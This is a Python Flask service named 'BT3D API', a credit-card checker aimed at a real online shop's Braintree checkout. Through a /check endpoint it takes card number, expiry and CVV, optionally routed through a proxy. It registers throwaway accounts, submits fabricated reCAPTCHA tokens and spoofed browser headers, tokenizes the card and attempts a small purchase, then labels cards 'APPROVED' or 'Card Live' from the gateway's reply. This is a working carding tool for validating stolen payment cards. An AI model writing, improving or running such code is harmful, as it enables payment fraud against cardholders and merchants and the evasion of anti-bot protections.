#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BT3D API - Braintree $3 Checker
Fixed proxy support
"""

from flask import Flask, request, jsonify
import requests
import re
import base64
import json
import random
import string
import os
from typing import Optional, Tuple

app = Flask(__name__)

class PianoPontoChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.session = requests.Session()
        self.user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        ])

        # Setup proxy with proper configuration
        if self.proxy:
            self.session.proxies = {
                'http': self.proxy, 
                'https': self.proxy
            }
            # Disable SSL verification for proxy (if needed)
            self.session.verify = False
            # Suppress warnings
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        self.jwt_token = None
        self.xsrf_token = None

    def decode_jwt_csrf(self, jwt_token):
        try:
            parts = jwt_token.split('.')
            if len(parts) >= 2:
                payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
                decoded = base64.b64decode(payload)
                data = json.loads(decoded)
                return data.get('csrf')
        except:
            pass
        return None

    def update_tokens(self):
        self.jwt_token = self.session.cookies.get('x-jwt-token')
        if self.jwt_token:
            self.xsrf_token = self.decode_jwt_csrf(self.jwt_token)
            return True
        return False

    def get_product_details(self) -> Tuple[str, float]:
        """
        Lấy product ID và giá tự động
        Returns: (product_id, price)
        """
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'origin': 'https://pianopronto.com',
                'referer': 'https://pianopronto.com/',
                'user-agent': self.user_agent,
            }

            # Tăng timeout cho proxy
            timeout = 30 if self.proxy else 15
            
            resp = self.session.get('https://api.pianopronto.com/page/main/shop-by/', 
                                   headers=headers, timeout=timeout)

            if resp.status_code == 200:
                data = resp.json()
                if 'products' in data and len(data['products']) > 0:
                    product = random.choice(data['products'])
                    pid = str(product.get('entity_id', '8956'))
                    price = product.get('final_price') or product.get('price') or 3.00
                    price_float = float(price)
                    print(f"[+] Selected Product: {pid} | Price: ${price_float}")
                    return pid, price_float

        except Exception as e:
            print(f"[-] Get product error: {e}")

        return '8956', 3.00

    def register(self):
        try:
            # Tăng timeout cho proxy
            timeout = 40 if self.proxy else 30
            
            # Step 1: Visit register page để lấy cookies
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': self.user_agent,
            }
            
            params = {'then': 'Lw'}

            print(f"[*] Visiting register page (proxy: {bool(self.proxy)})...")
            resp = self.session.get('https://secure.pianopronto.com/register/', 
                                   params=params, headers=headers, timeout=timeout)

            if resp.status_code != 200:
                print(f"[-] Register page failed: {resp.status_code}")
                return False

            # Update tokens after first request
            self.update_tokens()
            print(f"[+] Got XSRF token: {self.xsrf_token[:20] if self.xsrf_token else 'None'}...")

            # Small delay for proxy
            if self.proxy:
                import time
                time.sleep(1)

            # Step 2: Submit registration
            email = f"user{random.randint(10000,99999)}@gmail.com"
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + "!"

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://secure.pianopronto.com',
                'referer': 'https://secure.pianopronto.com/register/?then=Lw',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': self.user_agent,
                'x-xsrf-token': self.xsrf_token or '',
            }

            json_data = {
                'firstname': 'John',
                'lastname': 'Doe',
                'email': email,
                'password': password,
                'confirm_password': password,
                'customer_type': 'Student',
                'recaptcha_token': ''.join(random.choices(string.ascii_letters + string.digits, k=400)),
                'recaptcha_version': 3,
            }

            print(f"[*] Submitting registration for {email}...")
            resp = self.session.post('https://api.pianopronto.com/auth/register',
                                    headers=headers, json=json_data, timeout=timeout)

            print(f"[*] Register response: {resp.status_code}")
            
            if resp.status_code == 200:
                self.update_tokens()
                print(f"[+] Registration successful!")
                return True
            else:
                # Debug response
                try:
                    print(f"[-] Register failed: {resp.text[:200]}")
                except:
                    pass
                return False
                
        except requests.exceptions.ProxyError as e:
            print(f"[-] Proxy error: {e}")
            return False
        except requests.exceptions.Timeout as e:
            print(f"[-] Timeout error: {e}")
            return False
        except Exception as e:
            print(f"[-] Register error: {e}")
            return False

    def add_to_cart(self, product_id: str):
        try:
            timeout = 40 if self.proxy else 30
            
            if not self.xsrf_token:
                self.update_tokens()

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://pianopronto.com',
                'referer': 'https://pianopronto.com/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': self.user_agent,
                'x-xsrf-token': self.xsrf_token or '',
            }

            json_data = {'items': {product_id: 1}, 'details': False}

            resp = self.session.post('https://api.pianopronto.com/cart/add',
                                    headers=headers, json=json_data, timeout=timeout)
            return resp.status_code == 200
        except:
            return False

    def get_checkout_tokens(self):
        try:
            timeout = 40 if self.proxy else 30
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': self.user_agent,
            }

            resp = self.session.get('https://secure.pianopronto.com/checkout/',
                                   headers=headers, timeout=timeout)

            if resp.status_code != 200:
                return None, None

            html = resp.text
            token_match = re.search(r'"token":"([^"]+)"', html)
            if not token_match:
                return None, None

            decoded = base64.b64decode(token_match.group(1) + '==').decode('utf-8')
            auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
            auth_token = auth_match.group(1) if auth_match else None

            uuid_match = re.search(r'"uuid":"([^"]+)"', html)
            uuid = uuid_match.group(1) if uuid_match else None

            return auth_token, uuid
        except:
            return None, None

    def tokenize_card(self, auth_token, uuid, cc, mm, yy, cvv):
        try:
            timeout = 40 if self.proxy else 30
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {auth_token}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.user_agent,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client', 
                    'integration': 'custom', 
                    'sessionId': uuid
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc, 
                            'expirationMonth': mm, 
                            'expirationYear': yy, 
                            'cvv': cvv
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            resp = self.session.post('https://payments.braintree-api.com/graphql',
                                    headers=headers, json=json_data, timeout=timeout)

            if resp.status_code == 200:
                data = resp.json()
                token = data['data']['tokenizeCreditCard']['token']
                bin_info = data['data']['tokenizeCreditCard']['creditCard']['bin']
                return token, bin_info
            return None, None
        except:
            return None, None

    def checkout(self, payment_nonce):
        try:
            timeout = 45 if self.proxy else 35
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://secure.pianopronto.com',
                'referer': 'https://secure.pianopronto.com/checkout/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': self.user_agent,
                'x-xsrf-token': self.xsrf_token or '',
            }

            json_data = {
                'billing_address': {
                    'address_id': 'custom',
                    'custom': {
                        'firstname': 'John',
                        'lastname': 'Doe',
                        'street': ['123 Main St', ''],
                        'country_id': 'US',
                        'city': 'New York',
                        'region': 'New York',
                        'region_id': '43',
                        'postcode': '10001',
                        'telephone': '5551234567',
                    },
                },
                'payment_method': {
                    'method': 'gene_braintree_creditcard',
                    'nonce': payment_nonce,
                    'save_card': False,
                    'token': 'other',
                    'device_data': json.dumps({
                        "device_session_id": ''.join(random.choices('abcdef0123456789', k=32)),
                        "correlation_id": ''.join(random.choices('abcdef0123456789', k=32))
                    }),
                },
                'order_notes': '',
                'shipping_method': {'method': None},
                'shipping_address': {'address_id': 'none'},
                'details': True,
                'recaptcha_token': ''.join(random.choices(string.ascii_letters + string.digits, k=400)),
                'recaptcha_version': 3,
            }

            return self.session.post('https://api.pianopronto.com/cart/checkout',
                                    headers=headers, json=json_data, timeout=timeout)
        except Exception as e:
            print(f"Checkout error: {e}")
            return None

    def check(self, card_input: str) -> dict:
        parts = card_input.split('|')
        if len(parts) != 4:
            return {"status": "ERROR", "text": "Invalid format. Use: cc|mm|yy|cvv"}

        cc, mm, yy, cvv = parts[0], parts[1], parts[2][-2:], parts[3]

        try:
            # Lấy product
            product_id, product_price = self.get_product_details()

            # Đăng ký
            if not self.register():
                return {"status": "ERROR", "text": "Failed to create account", "price": f"${product_price}"}

            # Add to cart
            if not self.add_to_cart(product_id):
                return {"status": "ERROR", "text": "Failed to add product", "price": f"${product_price}"}

            # Get checkout tokens
            auth_token, uuid = self.get_checkout_tokens()
            if not auth_token:
                return {"status": "ERROR", "text": "Failed to get checkout tokens", "price": f"${product_price}"}

            # Tokenize card
            nonce, bin_info = self.tokenize_card(auth_token, uuid, cc, mm, yy, cvv)
            if not nonce:
                return {"status": "ERROR", "text": "Card tokenization failed", "price": f"${product_price}"}

            # Checkout
            resp = self.checkout(nonce)
            if not resp:
                return {"status": "ERROR", "text": "Checkout request failed", "price": f"${product_price}"}

            try:
                result = resp.json()
                if 'response' in result and 'err' in result['response']:
                    msg = result['response']['err'].get('message', 'Unknown error')
                else:
                    msg = result.get('message', str(result))
            except:
                msg = resp.text[:200]

            msg_lower = msg.lower()

            # Parse kết quả
            if any(x in msg_lower for x in ['success', 'approved']):
                return {
                    "status": "APPROVED",
                    "text": f"Charged ${product_price} Successfully",
                    "price": f"${product_price:.2f}",
                    "bin": bin_info or cc[:6],
                    "last4": cc[-4:],
                    "card": f"{cc[:6]}******{cc[-4:]}"
                }
            elif 'insufficient funds' in msg_lower:
                return {
                    "status": "APPROVED",
                    "text": f"Insufficient Funds (Amount: ${product_price})",
                    "price": f"${product_price:.2f}",
                    "bin": bin_info or cc[:6],
                    "last4": cc[-4:],
                    "card": f"{cc[:6]}******{cc[-4:]}"
                }
            elif any(x in msg_lower for x in ['cvv', 'cvc', 'security code']):
                return {
                    "status": "APPROVED", 
                    "text": f"CCV Mismatch - Card Live (Amount: ${product_price})",
                    "price": f"${product_price:.2f}",
                    "bin": bin_info or cc[:6],
                    "last4": cc[-4:],
                    "card": f"{cc[:6]}******{cc[-4:]}"
                }
            else:
                return {
                    "status": "DECLINED",
                    "text": msg,
                    "price": f"${product_price:.2f}",
                    "bin": bin_info or cc[:6],
                    "last4": cc[-4:],
                    "card": f"{cc[:6]}******{cc[-4:]}"
                }

        except Exception as e:
            return {"status": "ERROR", "text": str(e), "price": "$0.00"}

@app.route('/')
def home():
    """Health check"""
    return jsonify({
        "status": "alive",
        "service": "BT3D API",
        "version": "1.2-proxy-fixed"
    }), 200

@app.route('/check')
def check_card():
    """
    GET /check?cc=4111111111111111|12|25|123&proxy=http://user:pass@ip:port
    """
    try:
        cc = request.args.get('cc')
        proxy = request.args.get('proxy')

        if not cc:
            return jsonify({
                "status": "ERROR",
                "text": "Missing 'cc' parameter"
            }), 400

        if '|' not in cc or len(cc.split('|')) != 4:
            return jsonify({
                "status": "ERROR",
                "text": "Invalid format. Use: cc|mm|yy|cvv"
            }), 400

        checker = PianoPontoChecker(proxy=proxy)
        result = checker.check(cc)

        return jsonify(result), 200

    except Exception as e:
        return jsonify({
            "status": "ERROR",
            "text": f"Server error: {str(e)}"
        }), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"[*] Starting BT3D API on port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)